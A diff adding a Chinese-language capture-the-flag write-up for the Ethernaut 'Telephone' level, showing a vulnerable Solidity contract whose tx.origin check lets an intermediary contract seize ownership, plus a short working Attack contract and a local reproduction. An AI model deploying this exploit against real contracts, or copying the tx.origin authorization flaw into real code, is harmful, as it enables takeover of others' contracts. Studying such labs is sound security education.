@@ -295,3 +295,81 @@ remix ide的env选本地的
 attackMint函数可能提示这个，暂时不用管，不影响复现
 
 ![image-20240410151604930](README.assets/image-20240410151604930.png)
+
+
+
+
+
+# Telephone
+
+## 漏洞代码
+
+```
+题目要求：声明以下合同的所有权以完成此级别。
+```
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Telephone {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function changeOwner(address _owner) public {
+        if (tx.origin != msg.sender) {
+            owner = _owner;
+        }
+    }
+}
+```
+
+
+
+## 分析&攻击
+
+能改owner的就在changeOwne()函数里面，条件tx.origin != msg.sender满足时就会将owner改成address _owner参数的值，
+
+因此我们就要看下怎么满足这个条件
+
+这里我们借用wtf-solidity项目的图来解释一下这两个东西：tx.origin和msg.sender
+
+https://github.com/AmazingAng/WTF-Solidity/tree/main/S12_TxOrigin
+
+![img](README.assets/S12_1.jpg)
+
+
+
+很明显，要满足条件，就需要借助一个中间合约（图中合约B），然后随便一个用户A点击一下，就能满足tx.origin != msg.sender
+
+因此攻击代码无需很复杂，获取漏洞合约的地址，然后调用changeOwner()函数地址，我这里直接将Owner改成msg.sender，对于Attack来说msg.sender就是调用他的用户，你也可以随便换个其他的地址
+
+```
+contract Attack {
+    Telephone public tele;
+
+    constructor(Telephone _tele) {
+        tele = _tele;
+    }
+
+    function attackTele() public {
+        tele.changeOwner(msg.sender);
+    }
+
+}
+```
+
+
+
+我们先用用户1 部署Telephone合约，看到owner是用户1的地址0xf39....
+
+![image-20240410154607348](README.assets/image-20240410154607348.png)
+
+然后用户2部署Attack合约，点击attackTele之后，再看合约Telephone的owner地址，已经变成用户2的0x709...了
+
+![image-20240410160052121](README.assets/image-20240410160052121.png)
+
+![image-20240410160040713](README.assets/image-20240410160040713.png)
